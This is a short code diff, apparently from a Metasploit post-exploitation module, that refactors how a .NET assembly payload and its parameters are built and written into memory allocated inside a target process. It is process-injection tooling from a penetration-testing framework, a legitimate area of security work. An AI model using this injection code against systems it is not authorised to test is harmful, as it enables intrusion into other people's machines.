@@ -380,17 +380,19 @@ class MetasploitModule < Msf::Post
       signature
     ].pack('IIIIICCC')
 
-    payload_size = params.length
-    payload_size += assembly_size + cln_params.length + pipe_name.length + appdomain_name.length + clr_version.length
-    params += pipe_name
-    params += appdomain_name
-    params += clr_version
-    params += cln_params
+    payload = params
+    payload += pipe_name
+    payload += appdomain_name
+    payload += clr_version
+    payload += cln_params
+    payload += File.read(exe_path)
+
+    payload_size = payload.length
 
     # Memory management note: this memory is freed by the C++ code itself upon completion
     # of the assembly
-    allocated_memory = process.memory.allocate(payload_size, PAGE_READWRITE)
-    process.memory.write(allocated_memory, params + File.read(exe_path))
+    allocated_memory = process.memory.allocate(payload_size, PROT_READ | PROT_WRITE)
+    process.memory.write(allocated_memory, payload)
     print_status('Assembly copied.')
     allocated_memory
   end
